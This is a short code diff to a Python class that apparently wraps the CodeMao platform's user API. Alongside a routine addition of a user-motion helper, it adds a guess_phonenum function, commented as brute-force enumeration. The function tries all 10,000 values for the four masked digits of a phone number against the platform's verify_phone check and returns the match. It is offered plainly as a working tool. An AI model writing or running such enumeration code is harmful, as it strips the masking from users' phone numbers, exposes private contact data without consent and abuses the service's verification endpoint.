@@ -82,8 +82,10 @@ class UserUnion:
     def __init__(self) -> None:
         self.file = file.CodeMaoFile()
         self.user_obtain = user.Obtain()
+        self.user_motion = user.Motion()
         self.tool_routine = tool.CodeMaoRoutine()
 
+    # 新增粉丝提醒
     def message_report(self, user_id: str):
         response = self.user_obtain.get_user_honor(user_id=user_id)
         user_data = {
@@ -103,3 +105,12 @@ class UserUnion:
                 keys=["fans", "collected", "liked", "view"],
             )
         self.file.write(path=data.CACHE_FILE_PATH, text=user_data, type="dict")
+
+    # 猜测手机号码(暴力枚举)
+    def guess_phonenum(self, phonenum: str) -> int | None:
+        for i in range(10000):
+            guess = f"{i:04d}"  # 格式化为四位数，前面补零
+            test_string = int(phonenum.replace("****", guess))
+            print(test_string)
+            if self.user_motion.verify_phone(test_string):
+                return test_string
